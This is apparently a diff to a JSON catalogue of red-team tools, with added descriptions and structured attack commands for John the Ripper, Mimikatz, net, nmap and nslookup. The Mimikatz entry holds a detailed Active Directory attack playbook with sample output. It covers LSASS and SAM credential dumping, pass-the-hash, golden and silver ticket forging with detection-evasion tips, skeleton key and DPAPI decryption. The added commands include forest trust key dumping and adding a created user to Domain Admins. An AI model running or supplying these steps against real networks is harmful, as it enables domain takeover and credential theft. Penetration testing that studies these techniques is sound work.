@@ -68,7 +68,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://www.aircrack-ng.org/",
@@ -315,7 +315,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/digininja/CeWL",
@@ -553,7 +553,7 @@
         "name": "EyeWitness",
         "phases": [
             "02. Reconnaissance",
-            "06.Domain Enumeration"
+            "06. Domain Enumeration"
         ],
         "category": "",
         "stealthy": false,
@@ -794,7 +794,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1",
@@ -866,11 +866,30 @@
             "Linux"
         ],
         "source": "https://www.openwall.com/john/",
-        "description": "",
+        "description": "John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.",
         "undetected": [],
         "detected": [],
-        "content": "# John the Ripper\n\n\n## [[Crack Credentials]]\nCracking netntlmv2\n```sh\n--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2\n```\n\n\n",
-        "commands": []
+        "content": "# John the Ripper\n\n\n## [[Crack Credentials]]\nCracking netntlmv2\n'''sh\n--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2\n'''\n\n\n",
+        "commands": [
+            {
+                "id": "ff58951f-1f3f-4ba1-b0de-a11fe3a78740",
+                "name": "Cracking netntlmv2",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "john --format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2"
+            },
+            {
+                "id": "2d47de76-3f5c-4fc6-8aae-e2df72708d60",
+                "name": "Cracking Secretsdump",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "john --format=mscash2 --wordlist=/root/mydict.txt /root/2crack.txt"
+            }
+        ]
     },
     {
         "name": "Kill Defender",
@@ -1005,8 +1024,7 @@
         "stealthy": false,
         "platforms": [
             "Linux",
-            "Windows",
-            "#mac"
+            "Windows"
         ],
         "source": "https://github.com/robertdavidgraham/masscan",
         "description": "This is an Internet-scale port scanner. It can scan the entire Internet in under 5 minutes, transmitting 10 million packets per second, from a single machine.",
@@ -1068,7 +1086,47 @@
         "undetected": [],
         "detected": [],
         "content": "# Mimikatz\n\n\n\n## Commands\n``````powershell\n# Logonpasswords\nmimikatz sekurlsa::logonpasswords\n# Logonpasswords on lsass dmp\nmimikatz \"log log.txt\" \"sekurlsa::minidump C:\\Users\\patri\\Downloads\\sql2.bin\" \"sekurlsa::logonPasswords\"\n# Get [[Cached Domain Credentials]]\nmimikatz lsadump::cache\n# Get [[eKeys]] Kerberos aes265_hmac\nmimikatz sekurlsa::ekeys\n# Get local account hashes [[Security Account Manager]]\nmimikatz lsadump::sam\n# Get [[Data Protection API (DPAPI)]]\nmimikatz vault::list\n``````\n\n## Spawn process with injected credentials\nRequires admin\n``````sh\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # sekurlsa::pth /user:patrick /domain:edu.evil.corp /ntlm:2e8a408a8aec852ef2e458b938b8c071 /run:\"C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\"\nuser    : patrick\ndomain  : edu.evil.corp\nprogram : C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\nimpers. : no\nNTLM    : 2e8a408a8aec852ef2e458b938b8c071\n  |  PID  13608\n  |  TID  23228\n  |  LSA Process is now R/W\n  |  LUID 0 ; 3731125840 (00000000:de647650)\n  \\_ msv1_0   - data copy @ 000002B378344C10 : OK !\n  \\_ kerberos - data copy @ 000002B37859B388\n   \\_ des_cbc_md4       -> null\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ *Password replace @ 000002B378209E28 (32) -> null\n``````\n\n## [[Silver Ticket]]\n### Create silver ticket\n1. [[DCSync]] the krbtgt user\n2. Generate [[Silver Ticket]]\nWhere:\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain name.\n-   `/sid` is the current domain SID.\n-   `/target` is the target machine.\n-   `/aes256` is the AES256 key for the target machine.\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 - aes256_hmac\nService   : cifs\nTarget    : srv2\nLifetime  : 25/05/2022 10:30:08 ; 23/05/2031 10:30:08 ; 23/05/2031 10:30:08\n-> Ticket : srv2-cifs.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]\n\nHere are some useful ticket combinations:\n| Technique         | Required Service Tickets |\n| ----------------- | ------------------------ |\n| psexec            | CIFS                     |\n| winrm             | HOST & HTTP              |\n| dcsync (DCs only) | LDAP                     | \n\n## [[Golden Ticket]]\n### Create golden ticket (user)\n#OPSEC Specify the lifetime (mimikatz does abnormal 10 years)\nUse the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).\n\n1. Get DC [[PowerView#Get-DomainController]] \n2. [[PowerView#Get-DomainSID]]\n3. [[DCSync]] the krbtgt user\n4. Generate [[Golden Ticket]] as follows:\nWhere:\n-   `/user` is the username to impersonate : see 2\n-   `/domain` is the current domain name : see 1\n-   `/sid` is the current domain SID. : see 2\n-   `/aes256` is the AES256 key for the krbtgt : see 3\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac\nLifetime  : 3/11/2022 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM\n-> Ticket : golden.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]\n\n## [[Parent-Child]]\nrevert via:\n>beacon> rev2self\n\n### Create golden ticket ParentChild\n```beacon\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain rto.local -Properties ObjectSid\nobjectsid                                    \n---------                                    \nS-1-5-21-2323903455-1895497758-3703895482-512\n\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain child.rto.local -Properties ObjectSid\nobjectsid                                   \n---------                                   \nS-1-5-21-1886337448-2504686659-850325809-512\n\nhashdump\nor\nmimikatz lsadump::dcsync /user:CHILD\\krbtgt /domain:child.rto.local\naes256_hmac       (4096) : 0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477\n```\n\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain.\n-   `/sid` is the current domain SID.\n-   `/sids` is the SID of the target group to add ourselves to.\n-   `/aes256` is the AES256 key of the current domain's krbtgt account.\n-   `/startoffset` sets the start time of the ticket to 10 mins before the current time.\n-   `/endin` sets the expiry date for the ticket to 60 mins.\n-   `/renewmax` sets how long the ticket can be valid for if renewed.\n\n```beacon\nmimikatz kerberos::golden /user:Administrator /domain:child.rto.local /sid:S-1-5-21-1886337448-2504686659-850325809-512 /sids:S-1-5-21-2323903455-1895497758-3703895482-512 /aes256:0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477 /startoffset:-10 /endin:600 /renewmax:10080\n```\n\n## [[Skeleton Key]]\n```\nbeacon> mimikatz !misc::skeleton\n[KDC] data\n[KDC] struct\n[KDC] keys patch OK\n[RC4] functions\n[RC4] init patch OK\n[RC4] decrypt patch OK\n\nbeacon> make_token EDU\\Administrator mimikatz\n[+] Impersonated EDU\\john\n\nbeacon> ls \\\\dc-2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 11:11:35   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n dir     10/18/2016 01:59:39   Documents and Settings\n dir     05/23/2018 11:06:05   PerfLogs\n dir     12/13/2017 21:00:56   Program Files\n dir     05/10/2022 02:01:55   Program Files (x86)\n dir     03/10/2022 14:38:44   ProgramData\n dir     10/18/2016 02:01:27   Recovery\n dir     03/10/2022 13:52:03   Shares\n dir     05/19/2022 11:39:02   System Volume Information\n dir     03/11/2022 12:59:29   Users\n dir     05/19/2022 13:26:27   Windows\n 379kb    fil     01/28/2022 07:09:16   bootmgr\n 1b       fil     07/16/2016 13:18:08   BOOTNXT\n 448mb    fil     03/11/2022 09:19:53   pagefile.sys\n```\n\n## [[Data Protection API (DPAPI)]]\n#OPSEC Not recommended. Try gathering it from the DC\n\n>mimikatz vault::list\n>mimikatz sekurlsa::dpapi\n\n## Extract passwords locally\n1. Get subfolder path of {SID}\n``````sh\nGet-ChildItem C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Protect\\{SID}\\xxx\n\n Mode                 LastWriteTime         Length Name\n ----                 -------------         ------ ----\n -a-hs-        16.03.2022     13:00            468 29deba8c-55de-4930-97d5- 7d949402541b\n -a-hs-        16.03.2022     13:01            468 c3b72001-5fd0-4a1d-b548- b4e6fcecd431\n -a-hs-        24.01.2022     20:00             24 Preferred\n``````\n\n2. Choose one of the encrypted creds\n``````powershell\nGet-ChildItem -Hidden C:\\Users\\$env:username\\AppData\\Local\\Microsoft\\Credentials\n\n Mode                 LastWriteTime         Length Name\n ----                 -------------         ------ ----\n -a-hs-        05.01.2022     20:00           3252 040F76937B2E54B70658AF91D1BEBCCF\n -a-hs-        15.03.2022     14:06           3012 0437BF9439473166B0F4C16EC80BC809\n``````\n\n3. Check for guid masterkey of encrypted creds via [[Mimikatz]]\n``````powershell\ndpapi::cred /in:C:\\Users\\patri\\AppData\\Local\\Microsoft\\Credentials\\040F76937B2E54B70658AF91D1BEBCCF\n\n**BLOB**\n  dwVersion          : 00000001 - 1\n  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}\n  dwMasterKeyVersion : 00000001 - 1\n  guidMasterKey      : {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}\n``````\n\n4. Get DPAPI master key listed in 3 as guidMasterKey.\n``````powershell\ndpapi::masterkey /in:C:\\Users\\patri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3318663386-1925972964-1342212060-1001\\c3b72001-5fd0-4a1d-b548-b4e6fcecd431 /rpc\n\n# OR VIA LOCAL IF NOT DOMAIN JOINED\nsekurlsa::dpapi\n\nAuthentication Id : 0 ; 658810602 (00000000:2744a6ea)\nSession           : Interactive from 3\nUser Name         : patri\nDomain            : PHANTOM\nLogon Server      : (null)\nLogon Time        : 16.03.2022 12:59:58\nSID               : S-1-5-21-3318663386-1925972964-1342212060-1001\n         [00000000]\n         * GUID      :  {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}\n         * Time      :  16.03.2022 13:07:03\n         * MasterKey :  877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf4333a7c38c[SNIP]21f9ba45cb6a1ea974839762\n         * sha1(key) :  71e8820de4c5f31bc7d81c44ed85bcc720e46536\n         [00000001]\n         * GUID      :  {29deba8c-55de-4930-97d5-7d949402541b}\n         * Time      :  16.03.2022 13:32:13\n         * MasterKey :  976241ce72ce24871d8b5c05775549a8025e4a8d8c52594c57d7d8206dd5d4f0889c9a242d2fed8b562c703f82[SNIP]091ce38cbb27346be13abef8\n         * sha1(key) :  c27a0c1eb6a9b65c698cad771fa6346e3517e148\n``````\n\n5. decrypt file from 2 with key from 4.\n``````powershell\ndpapi::cred /in:C:\\Users\\patri\\AppData\\Local\\Microsoft\\Credentials\\040F76937B2E54B70658AF91D1BEBCCF /masterkey:877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf433[SNIP]21f9ba45877b1426c72cb\n``````\n\n## [[Cached Domain Credentials]]\nUnfortunately, the hash format is not NTLM.\n\nTo crack these with [[Hashcat]], we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<MsCacheV2hash>`.\n\n``````\nbeacon> mimikatz lsadump::cache\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\n\nLocal name : SRV1 ( S-1-5-21-4124990477-354564332-720757739 )\nDomain name : EDU ( S-1-5-21-3263068140-2042698922-2891547269 )\nDomain FQDN : edu.evil.corp\n\nPolicy subsystem is : 1.14\nLSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}\n  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983\n\n* Iteration is set to default (10240)\n\n[NL$1 - 2/25/2022 1:07:37 PM]\nRID       : 00000460 (1120)\nUser      : EDU\\john\nMsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419\n\n[NL$2 - 5/17/2022 2:00:46 PM]\nRID       : 0000046e (1134)\nUser      : EDU\\svc_mssql\nMsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6\n\n[NL$3 - 5/17/2022 2:00:50 PM]\nRID       : 00000462 (1122)\nUser      : EDU\\doe\nMsCacheV2 : 673e2fe26e26e79c58379168b79890f6\n``````\n\n## [[eKeys]]\nThis Mimikatz module will dump [[Kerberos]] encryption keys.\n``````beacon\nbeacon> mimikatz sekurlsa::ekeys\n\nAuthentication Id : 0 ; 113277 (00000000:0001ba7d)\nSession           : Interactive from 1\nUser Name         : doe\nDomain            : EDU\nLogon Server      : DC-2\nLogon Time        : 5/24/2022 9:00:11 AM\nSID               : S-1-5-21-3263068140-2042698922-2891547269-1122\n\n * Username : doe\n * Domain   : edu.evil.corp\n * Password : (null)\n * Key List :\n aes256_hmac       a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n rc4_hmac_nt       4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_old      4ffd3eabdce2e158d923ddec72de979e\n rc4_md4           4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_nt_exp   4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_old_exp  4ffd3eabdce2e158d923ddec72de979e\n``````\n\n## [[LSASS dumping]]\n``````\nbeacon> mimikatz sekurlsa::logonpasswords\n``````\n\n## [[Pass-the-Hash]]\n#OPSEC this to specify the programm and avoid the weird piping into cmd.exe\n## Recommended\n``````beacon\nbeacon> mimikatz sekurlsa::pth /user:doe /domain:edu.evil.corp /ntlm:4ffd3eabdce2e158d923ddec72de979e\n\nuser    : doe\ndomain    : edu.evil.corp\nprogram    : cmd.exe\nimpers.    : no\nNTLM    : 4ffd3eabdce2e158d923ddec72de979e\n  |  PID  6284\n  |  TID  6288\n  \nbeacon> steal_token 6284\n[+] Impersonated NT AUTHORITY\\SYSTEM\n``````\n\n## [[Security Account Manager]]\n``````\nbeacon> mimikatz lsadump::sam\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\nLocal SID : S-1-5-21-4124990477-354564332-720757739\n\nSAMKey : fb5c3670b47e5ecae21f328b12d3103c\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 12a427a6fdf69be4917d30afc633f6fd\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n``````\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "0fc51c4d-d9ef-49e0-a4e5-f8f7ccc15c06",
+                "name": "Dump Forest Trust Key",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:HASH:TRUSTKEY"
+                ],
+                "cmd": "lsadump::trust /path",
+                "requirements": {
+                    "tag": "PRIVS:ADMIN"
+                }
+            },
+            {
+                "id": "1d8cbd1d-35aa-441a-9fcc-d88d900b472a",
+                "name": "Create Golden Ticket with Inter-Realm-Key",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:TICKET:TGT:GOLDEN"
+                ],
+                "cmd": "kerberos::golden /domain:current_domain /sid:current_domain_s_SID\n/rc4:forest_trust_key_NTLM_hash /user:Administrator /service:krbtgt\n/target:external_domain_FQDN /ticket:path_to_save_the_TGS",
+                "requirements": {
+                    "and": [
+                        {
+                            "tag": "INTEL:DOMAIN:SID"
+                        },
+                        {
+                            "tag": "INTEL:DOMAIN:DOMAINS"
+                        },
+                        {
+                            "tag": "CRED:HASH:TRUSTKEY"
+                        },
+                        {
+                            "tag": "INTEL:DOMAIN:TRUSTS"
+                        }
+                    ]
+                }
+            }
+        ]
     },
     {
         "name": "MiniDump",
@@ -1203,12 +1261,23 @@
         "platforms": [
             "Windows"
         ],
-        "source": "",
-        "description": "",
+        "source": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems",
+        "description": "Net Commands can be used to perform operations on Groups, users, account policies, shares, and so on.",
         "undetected": [],
         "detected": [],
-        "content": "# Net\n\n## [[Local User+Groups]]\n1. Create User:\n    ```bash\n    net user Patrick patrick12345! /ADD /DOMAIN\n    ```\n2. List local / domain groups\n    ```bash\n    net group /domain\n\n    Gruppenkonten f\u00fcr \\\\dc1.testdomain.local\n    -------------------------------------------------------------------------------\n    *$7O...\n    *Abteilung_....\n    *Dom\u00e4nen-Admins\n    \n    net localgroup [group (Remote Dektop Users)]\n    ```\n1. Add User to domain /local group\n    ```sh\n    net group \"Dom\u00e4nen-Admins\" Patrick /add /domain\n\n    net localgroup \"Remote Desktop Users\" Patrick /add\n    net localgroup \"Administrators\" Patrick /add\n    ```\n\n## [[Domain Controller]]\nFrom domain joined device  \n>net group \"domain controllers\" /domain\n>nslookup dc-01\n>net time\n\n## [[Web Proxies]]\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> run net user john /domain\nThe request will be processed at a domain controller for domain edu.evil.corp.\n[...snip...]\n\nGlobal Group memberships     *Domain Users         *Roaming Users        \n                             *Developers           *Proxy Users\n``````\n\n\n\n",
-        "commands": []
+        "content": "# Net\n\n## [[Local User+Groups]]\n1. Create User:\n    '''bash\n    net user Patrick patrick12345! /ADD /DOMAIN\n    '''\n2. List local / domain groups\n    '''bash\n    net group /domain\n\n    Gruppenkonten f\u00fcr \\\\dc1.testdomain.local\n    -------------------------------------------------------------------------------\n    *$7O...\n    *Abteilung_....\n    *Dom\u00e4nen-Admins\n    \n    net localgroup [group (Remote Dektop Users)]\n    '''\n1. Add User to domain /local group\n    '''sh\n    net group \"Dom\u00e4nen-Admins\" Patrick /add /domain\n\n    net localgroup \"Remote Desktop Users\" Patrick /add\n    net localgroup \"Administrators\" Patrick /add\n    '''\n\n## [[Domain Controller]]\nFrom domain joined device  \n>net group \"domain controllers\" /domain\n>nslookup dc-01\n>net time\n\n## [[Web Proxies]]\n''''''beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> run net user john /domain\nThe request will be processed at a domain controller for domain edu.evil.corp.\n[...snip...]\n\nGlobal Group memberships     *Domain Users         *Roaming Users        \n                             *Developers           *Proxy Users\n''''''\n\n\n\n",
+        "commands": [
+            {
+                "id": "bcd159d3-a6d6-4ba3-baa3-a514177f138d",
+                "name": "View Computers ",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:COMPUTERS"
+                ],
+                "cmd": "net view /domain:ecorp"
+            }
+        ]
     },
     {
         "name": "netcat",
@@ -1296,7 +1365,18 @@
         "undetected": [],
         "detected": [],
         "content": "# NMAP\n\nScan phases\n===========\n\n1.  Script pre-scanning\n    1.  only when NSE scans\n    2.  executed once per run\n2.  Target enumeration\n    1.  executed once per run\n3.  Host discovery\n    1.  also known as \"Ping Scanning\"\n    2.  skipped with -Pn\n    3.  assume all hosts are online\n4.  Reverse-DNS resolution\n    1.  provides DNS name for ip address\u00a0\n    2.  skipped with -n\n    3.  force with -r\n5.  Port scanning\n    1.  executed once per host\n    2.  skipped with -sn\n6.  Version detection\n    1.  enabled with -sV\n7.  OS detection\n    1.  enable with -O\n8.  Traceroute\n    1.  enable with --traceroute\n9.  Script scanning\n    1.  most NSE is run here\n10.  Output\n    1.  write to screen or files\n11.  Script post-scanning\n    1.  possible to use but currently not used\n\nCommands\n========\n\n1.  Version:  \n    nmap -V\n2.  Help  \n    nmap, nmap -h, man nmap\n3.  Input  \n    \\-iL hostList\n4.  Output  \n    \\-oN textfile  \n    \\-oX xml  \n    \\-oS scriptkiddy  \n    \\-oG greppable format  \n    \\-oA normal + xml + greppable  \n    \\-v, -vv, -vvv increase level of details\n5.  TCP Flags  \n    \\-sS: TCP SYN scan  \n    \\-sA: TCP ACK scan  \n    \\-sT: TCP connect scan\n6.  ICMP scan  \n    Ping Scan\u00a0!= ICMP  \n    _nmap -sn -PE <target>_\n7.  NSE scripts\n    _nmap <option> -sC <target> (_launch all 'default' NSE  \n    nmap --script vuln --script-args=unsafe=1 -iL hostname.txt  \n    nmap --script-help=</script>\n    _nmap <option> --script=</script name or category , seperated> <target>_ (launch specific NSE script)  \n    _nmap --script ssl-enum-ciphers -p 443 www.example.com_\n8.  Scan-Technique  \n    \\-sS (TCP Syn Scan, default NMAP)  \n    \\-sT (TCP Connect Scan, default if no admin)  \n    \\-sU (UDP Scan)  \n    \\-sO (IP protocol Scan)\n9.  Discovery\u00a0Options  \n    \\-sL (List Scan)  \n    \\-sn (No Port Scan, called Ping Scan or Ping Sweep, GET MAC+IP+Name), ICMP echo request + TCP SYN to 443 + ACK to 80 + ICMP timestamp  \n    \\-Pn (No ping, 1000Ports for every IP), Skip discovery step  \n    \\-F (Most common 100 Ports)  \n    \\-n (No DNS resolution)  \n    \\-R (Resolve all using DNS)  \n    \\--traceroute (Trace path to host)  \n    \\--dns-server <server1>,<server2> (Use custom DNS server for PTR lookup)\n10.  TCP Flags  \n    \\-PS (SYN Ping)  \n    \\-PA (ACK Ping)  \n    \\-PU (UDP Ping)  \n    \\-PY (SCTP INIT Ping),\u00a0Stream Control Transmission Protocol  \n    \\-PO (IP Protocol Ping)  \n    \\-PE, -PP, -PM\u00a0(ICMP Ping)  \n    \\-PR (ARP Ping), Get-MAC address in a local network -sn is BETTER\n11.  States  \n    Open: Accept packets  \n    Closed: Is reachable but nothing excepts the packets  \n    Filtered: Packet filtering is blocking  \n    Unfiltered: Accessible but cannot detect\n12.  Timing templates  \n    \\-T0 (Paranoid, IDS evasion)  \n    \\-T1 (Sneaky, IDS evasion)  \n    \\-T2 (Polite, Slows down)  \n    \\-T3 (Normal (Default)  \n    \\-T4 (Aggressive, fast reliable network)  \n    \\-T5 (Insane, Very fast network)\n13.  Version detection  \n    \\-sS (Version detection)  \n    \\--version-light (--version-intensity 2)  \n    \\--version-all (--version-intensity 9)\n14.  OS discovery  \n    _nmap -T4 -O -v --script=smb-os-discovery_ (OS discovery)  \n    \\--osscan-limit (If not 1xOpen\u00a0 & 1xClosed port exist, nmap will NOT guess, reduce bullshit)  \n    \\--osscan-guess or --fuzzy (NMAP will best guess the OS)  \n    \\--max-os-tries <value> (increase speed)\n15.  ALL IN ONE  \n    \\-A (advanced and aggressive), detailed port scanning, version detection, os detection, and NSE 'default' scripts)\n\n######\n\n## [[OT Devices]]\n> .\\nmap.exe -p- --script=s7-info,modbus-discover,bacnet-info,enip-info,Siemens-CommunicationsProcessor.nse,Siemens-HMI-miniweb.nse,Siemens-Scalance-module.nse,Siemens-SIMATIC-PLC-S7.nse,Siemens-WINCC.nse 172.29.137.100\n\n## [[SMB Signing]]\n> nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK\n\n## [[User enum]]\n> nmap -n -sV --script \"ldap* an not brute\" -p 389 <dc-ip>\n\n## [[Exposed Machines]] [[Domain Computers]]\n* Ping Scan  \n> nmap -sP -p <ip>\n* Search smb vuln  \n> nmap -PN --script smb-vuln* -p139,445 <ip>\n* Classic Scan  \n> nmap -PN -sC -sV <ip>\n* Full Scan  \n>nmap -PN -sC -sV -p- <ip>\n* UDP Scan  \n>nmap -sU -sC -sV <ip>\n\n## [[SOCKS Proxy]]\nNmap example via proxychains:\n``````sh\nproxychains nmap -n -Pn -sT -p445,3389,5985 10.10.1.20\n``````\n\u26a0\ufe0fICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for this to work\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "48485f28-a541-4bff-9d0b-f73bef3c57ae",
+                "name": "Find Shares",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:SHARES"
+                ],
+                "cmd": ".\\nmap.exe -T4 script=smb-enum-shares <ip>"
+            }
+        ]
     },
     {
         "name": "nmcli",
@@ -1322,16 +1402,37 @@
             "06. Domain Enumeration"
         ],
         "category": "",
-        "stealthy": false,
+        "stealthy": true,
         "platforms": [
             "Windows"
         ],
-        "source": "",
+        "source": "https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/nslookup",
         "description": "Nameserver lookups on the network",
         "undetected": [],
         "detected": [],
-        "content": "## [[Domain Controller]]\nShow Domain  \n* `nslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/`\n* `nslookup -type=SRV _kerberos._tcp.dc._msdcs.<searchdomain>`\n* `nslookup -type=A gc._msdcs.<DNSForestName>`\n* `nslookup -type=SRV _ldap._tcp.pdc._msdcs.<searchdomain>`\n* `nslookup -type=SRV _ldap._tcp.gc._msdcs.<searchdomain>`\n* `nslookup -type=A <DC_FQDN>`\n\n## [[Find Mail Server]]\nFind exchange server via nslookup  \n`nslookup -q=MX <domain>`\n`nslookup _tcp._autodiscover.domain.com`  \n`nslookup autodiscover.domain.com`  \n`nslookup mail.domain.com`  \n`nslookup email.domain.com`  \n`nslookup owa.domain.com`  \n`nslookup securemail.domain.com`  \n\n\n",
-        "commands": []
+        "content": "## [[Domain Controller]]\nShow Domain  \n* 'nslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/'\n* 'nslookup -type=SRV _kerberos._tcp.dc._msdcs.<searchdomain>'\n* 'nslookup -type=A gc._msdcs.<DNSForestName>'\n* 'nslookup -type=SRV _ldap._tcp.pdc._msdcs.<searchdomain>'\n* 'nslookup -type=SRV _ldap._tcp.gc._msdcs.<searchdomain>'\n* 'nslookup -type=A <DC_FQDN>'\n\n## [[Find Mail Server]]\nFind exchange server via nslookup  \n'nslookup -q=MX <domain>'\n'nslookup _tcp._autodiscover.domain.com'  \n'nslookup autodiscover.domain.com'  \n'nslookup mail.domain.com'  \n'nslookup email.domain.com'  \n'nslookup owa.domain.com'  \n'nslookup securemail.domain.com'  \n\n\n",
+        "commands": [
+            {
+                "id": "c1460e95-3d40-4186-8abe-0d2131fea55e",
+                "name": "Show Domain",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:DC"
+                ],
+                "cmd": "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN\nnslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/\nnslookup -type=SRV _kerberos._tcp.dc._msdcs.<searchdomain>\nnslookup -type=A gc._msdcs.<DNSForestName>\nnslookup -type=SRV _ldap._tcp.pdc._msdcs.<searchdomain>\nnslookup -type=SRV _ldap._tcp.gc._msdcs.<searchdomain>\nnslookup -type=A <DC_FQDN>"
+            },
+            {
+                "id": "b4edfce8-8bb0-421c-a907-478f66c74d03",
+                "name": "Find Exchange Server",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "SERVER:EXCHANGE"
+                ],
+                "cmd": "nslookup -q=MX <domain>\nnslookup _tcp._autodiscover.domain.com\nnslookup autodiscover.domain.com\nnslookup mail.domain.com\nnslookup email.domain.com\nnslookup owa.domain.com\nnslookup securemail.domain.com"
+            }
+        ]
     },
     {
         "name": "ntlmrelayx",
@@ -1415,12 +1516,158 @@
         "platforms": [
             "Windows"
         ],
-        "source": "",
+        "source": "https://learn.microsoft.com/de-de/powershell/?view=powershell-7.3",
         "description": "PowerShell",
         "undetected": [],
         "detected": [],
